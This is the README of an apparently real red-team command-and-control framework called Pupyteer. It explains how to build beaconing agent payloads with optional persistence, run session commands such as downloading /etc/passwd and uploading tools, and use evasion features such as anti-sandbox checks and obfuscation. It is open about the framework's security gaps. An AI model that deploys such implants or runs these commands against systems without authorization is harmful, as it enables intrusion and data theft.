# ╔══════════════════════════════════════════════════════════╗
# ║                    PUPYTEER                               ║
# ║          Red Team Operations Framework                   ║
# ╚══════════════════════════════════════════════════════════╝

> **Pupyteer** is a modular, operator-focused C2 and adversary-emulation framework built for authorized security assessments and red-team engagements.

Built as a modernization of the Pupy framework, Pupyteer prioritizes **modularity, reliability, controlled deployment, and detection resilience**. All components follow clear interface boundaries, enabling extensibility without coupling.

---

## ⚡ Quick Start

### From Source (Recommended for Development)

```bash
git clone https://github.com/yourorg/pupyteer
cd pupyteer

python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
pip install -e .
```

### Run the console

```bash
pupyteer                 # interactive TUI (starts the server and console together)
pupyteer --headless      # server only, no console
pupyteer -c ./pupyteer.yaml
pupyteer --debug
```

`pupyteer` is the single installed entry point (`pupyteer.main:main`).

### Generate a Payload

Either from the console:

```
pupyteer > payloads build --name test-payload --platform linux --arch x64 \
             --type script --transport tcp --host 192.168.100.100 --port 8443 \
             --profile HTTPS-Standard --sleep 30 --jitter 25
```

`--type script` is the portable path: it emits a standalone `.py` agent that runs
on the target with nothing but a Python interpreter.

`--type executable` runs PyInstaller or Nuitka as a real subprocess. Both freeze
an binary for the machine that builds it, so:

- the tool has to be installed on the team server (`pip install pyinstaller`), and
- `--platform` has to match the team server's own OS — you cannot produce a Linux
  ELF from a Windows host, or the reverse.

Either way the build fails and says so rather than handing back a file with an
executable's name and none of its contents.

`--sleep` / `--jitter` set the beacon interval compiled into the payload.
`--persistence` is **off by default**: the agent only installs a registry /
crontab entry when you ask for it explicitly. `--screenshot` is likewise opt-in;
a payload built without it answers a capture request with `unknown action`.

To use HTTP callbacks instead, enable the listener in the server config and
build with `--transport http`:

```yaml
server:
  host: "0.0.0.0"
  port: 8443        # TCP callbacks
  http_port: 8080   # HTTP callbacks; 0 disables them
  http_uri: "/index.html"
  tls: true         # serve both listeners over TLS; payloads pin the certificate
  agent_auth: true  # require payloads to present this server's enrollment secret
```

`tls: true` generates a self-signed pair at `server.tls_cert` / `server.tls_key`
on the listener's first start and compiles that certificate into every payload
built afterwards, so the agent trusts one certificate and nothing else. It is off
by default because it changes what payloads can connect — turn it on before the
server starts and before you build, and reuse the same key pair, since replacing
it strands payloads already in the field.

`agent_auth` (on by default) is the other half: TLS proves the listener to the
agent, the enrollment secret proves the agent to the listener. On first use the
server generates a secret at `server.agent_auth_file` and every payload built
afterwards bakes it into its `register` message; a registration without it is
refused before a session is created, so finding the open port is no longer enough
to get a handler. Turn it off with `agent_auth: false` only on an interface you
already trust; the banner and a startup warning say when it is off.

`--transport https` works with `tls: true`, or with `server.https_cert` /
`server.https_key` for a certificate you obtained yourself, or against a reverse
proxy holding a real one.

Or programmatically:

```python
import asyncio
from pupyteer.server.core.engine import PupyteerEngine
from pupyteer.payloads.manager import PayloadConfig, PayloadType

async def main():
    engine = PupyteerEngine()
    await engine.start()
    config = PayloadConfig(
        name="test-payload",
        payload_type=PayloadType.SCRIPT,
        transport="tcp",
        host="192.168.100.100",
        port=8443,
        profile="HTTPS-Standard",
        sleep=30,
        jitter=25,
    )
    metadata = await engine.payloads.build(config)
    print(f"Artifact: {metadata.artifact_path} ({metadata.size_bytes} bytes)")
    print(f"SHA256: {metadata.hash_sha256}")
    await engine.stop()

asyncio.run(main())
```

### Work a Session

Run the generated artifact on the target host; it registers over the listener
and beacons. Then, from the console:

```
pupyteer > sessions list                       # callbacks
pupyteer > sessions interact <session_id>      # shell: sysinfo, ps, fs_list /etc, id -u
pupyteer > sessions results <session_id>       # output of commands already answered
pupyteer > sessions download <session_id> /etc/passwd ./passwd
pupyteer > sessions upload <session_id> ./tool /tmp/tool
pupyteer > sessions screenshot <session_id> ./screen.png   # needs --screenshot
```

Commands are queued per session and delivered on the agent's next check-in, so
output appears after up to one beacon interval. Inside `sessions interact` the
shell waits and prints the reply; if you leave early, `sessions results` catches
up. Transfers are chunked, so a file larger than the operator's memory is not a
problem.

`sessions screenshot` captures the whole screen using whatever the host already
provides — PowerShell's `System.Drawing` on Windows, `screencapture` on macOS,
and the first available of `gnome-screenshot`/`scrot`/`spectacle`/
`xfce4-screenshooter`/`import`/`grim` on Linux — so the agent pulls in no imaging
library. The image is returned over the session and deleted from the target's
temp directory; there is no third-party dependency to ship.

---

## 🏗️ Architecture

```
PUPYTEER
  ├── Server (C2 Engine)
  │   ├── Session Manager      — agent lifecycle, tagging, interaction
  │   ├── Task Queue           — async priority task scheduling
  │   ├── Profile Manager      — malleable C2 profiles (YAML)
  │   ├── Transport Manager    — TCP + HTTP/HTTPS listeners (see Transports)
  │   ├── Module Registry      — pluggable modules with ABC interface
  │   ├── Payload Manager      — build, versioning, artifact lifecycle
  │   ├── Evasion Engine       — obfuscation + Litterbox analysis
  │   ├── Auth Layer           — roles/JWT implemented, not yet wired
  │   ├── Audit Logger         — structured JSON with redaction
  │   └── RBAC                 — VIEWER/OPERATOR/ADMIN/SYSTEM
  │
  ├── Agent (Stub)
  │   ├── Core agent loop
  │   ├── Transport clients
  │   ├── Server-dispatched modules (see server/modules)
  │   └── Sleep masking
  │
  └── TUI
      ├── Startup banner & status bar
      ├── Session dashboard
      ├── Payload & evasion commands
      └── Command history & autocomplete
```

---

## 📋 Features

| Category | Capabilities |
|----------|-------------|
| **Payloads** | Python script, PE executable, versioning, metadata tracking, signing stub |
| **Transports** | Served listeners: **TCP** and **HTTP/HTTPS** (same session protocol, one JSON message per POST). Agent-side DNS/DoH/WebSocket stubs exist but have no listener, so `payloads build` rejects them rather than ship a payload that can never call back. |
| **C2 Profiles** | YAML-based malleable C2 — heartbeat, encoding, timeouts, headers, URIs |
| **Modules** | Core, Recon, Execution, File Ops, Red-Team, Evasion — standardized ABC |
| **Sessions** | list/info/interact/rename/kill/tag/search, chunked file upload & download, screen capture, audit trail |
| **Tasks** | Priority queue (CRITICAL → BACKGROUND), async execution, tracking |
| **Evasion** | XOR/AES/RC4 obfuscation, PE manipulation, anti-sandbox/debug/VM, Litterbox integration |
| **Security** | audit trail with redaction, input validation, optional TLS on callbacks (see Security for what is not wired) |
| **Audit** | JSON-structured logs, operator attribution, redaction, rotation, query API |
| **TUI** | ASCII banner, themes, autocomplete, history, resize handling, dashboard |

---

## 📂 Project Structure

```
pupyteer/
├── server/
│   ├── core/          # engine, config, auth, audit, logging, errors, queue, c2, rbac, validation
│   ├── sessions/      # session lifecycle, tagging, interaction
│   ├── tasks/         # task manager
│   ├── transports/    # Transport ABC + concrete implementations + listener
│   ├── profiles/      # malleable C2 profile parser/validator/manager + CS converter
│   ├── modules/       # registry, executor, builtin modules (recon, evasion)
│   └── evasion/       # obfuscator, litterbox client, test runner, models
│
├── agent/
│   └── core/          # agent loop, auth, stub generator, sleep masking
│
├── payloads/          # payload builder, signer, store, artifact lifecycle
│
├── tui/
│   ├── app.py         # console application, command registry, completer
│   ├── themes.py      # dark/light theme definitions
│   ├── screens/       # (reserved)
│   ├── widgets/       # (reserved)
│   └── commands/      # sessions, jobs, payloads, evasion, pipeline, msf_core
│
├── config/
│   ├── defaults/      # pupyteer.yaml template
│   └── profiles/      # C2 profile definitions
│
├── tests/
│   ├── unit/          # unit tests
│   ├── integration/   # integration tests
│   └── regression/    # regression tests
│
├── tools/             # agent simulator, callback tester
│
└── docs/              # operator manual, developer docs, profile & module guides,
                       # security notes, installation guide
```

Generated artifacts land in `./payloads/artifacts` and logs in `./logs` — both
git-ignored.

---

## 🧪 Testing

```bash
# All tests
.venv/bin/python -m pytest pupyteer/tests/ -v

# Unit only
.venv/bin/python -m pytest pupyteer/tests/unit/ -v

# Integration only
.venv/bin/python -m pytest pupyteer/tests/integration/ -v
```

**Current test count: 798 tests passing** (`pytest pupyteer/tests`)

---

## 🔒 Security

**Read this section before using Pupyteer against anything.** A C2 framework that
overstates its own protections is worse than one with fewer features, so this
section describes what the running code does, not what its modules could do.

### What works today

- **Audit logging** — operator actions recorded with attribution
- **Credential redaction** — secrets are kept out of audit logs
- **Input validation** — operator inputs checked before execution
- **Transport TLS with certificate pinning** — set `server.tls: true` and both
  listeners serve TLS from a generated self-signed pair
  (`server.tls_cert`/`server.tls_key`). Payloads built while it is on compile that
  certificate in and trust *only* it: signature verification stays on, so a
  man-in-the-middle without your certificate is rejected, and you never need a CA
  certificate for a bare team-server IP. `--transport https` reaches the same
  listener over `https://`. A certificate already in use is never replaced under
  those paths — regenerating it would strand every payload in the field.
- **Authenticated agent enrollment** — with `server.agent_auth` on (the default)
  the server keeps a generated secret at `server.agent_auth_file`; a `register`
  that does not present it is refused *before* any session exists, counted in the
  listener stats and written to the audit log as `registration_rejected`. Payloads
  built by this server compile that secret into their `register` message, and an
  agent whose enrollment is refused exits instead of beaconing against a server
  that will never admit it. Both listeners apply the same check.
- **Verification gates** — `scripts/verify_secure_defaults.py --strict` and
  `scripts/audit_deps.py` both exit non-zero on findings

### What does not work yet

- **TLS is opt-in.** The default is still plaintext: over the TCP listener, and
  the HTTP listener without TLS, messages are newline-delimited JSON — base64
  over HTTP is encoding, not encryption. Turn on `server.tls` *before* building
  payloads and before starting the server (the listener reads it when it binds),
  and assume anything on the path can read your commands and results otherwise.
- **Enrollment is one shared secret, not per-agent credentials.** Every payload
  this server builds carries the same string, so it identifies the team server,
  not the host: whoever recovers a dropped binary can enroll sessions as if they
  were you, and so can whoever reads `data/keys/enrollment.key`. Rotating it
  strands everything already in the field — there is no re-keying channel, because
  an agent that cannot register cannot receive a new secret. `server.agent_auth:
  false` removes the check entirely.
- **There is no operator login in the running tool.** `server/core/auth.py` and
  `agent/core/auth.py` implement roles, JWT and a challenge-response signer, and
  `security.operators` in the default config carries an `admin` entry — but
  nothing calls `authenticate()`, so no code path enforces any of it. The console
  is local-only today, which is why this is not yet exposed; it is not a defence.
  Do not treat the shipped credential as a real password.
- **There is no payload-level cipher.** `StubConfig.obfuscation_key` keys the
  string-table XOR used to obfuscate the script; it is not, and never was, an
  encryption layer for the channel. Confidentiality comes from TLS only.

Treat network-level access control on the team server as part of the deployment.

---

## ⚠️ Legal & Ethical Notice

This framework is intended **exclusively for authorized security testing and adversary emulation**. Unauthorized use against systems without explicit written permission is illegal and unethical.

---

## 📜 License

BSD 3-Clause — See [LICENSE](LICENSE) for details. Pupyteer is derived from
Pupy (Copyright © 2015 Nicolas VERDIER) and retains that notice. No third-party
source is vendored; dependencies are pip-installed per `requirements.txt`.

---

**Built for authorized red-team operations. Test responsibly.**
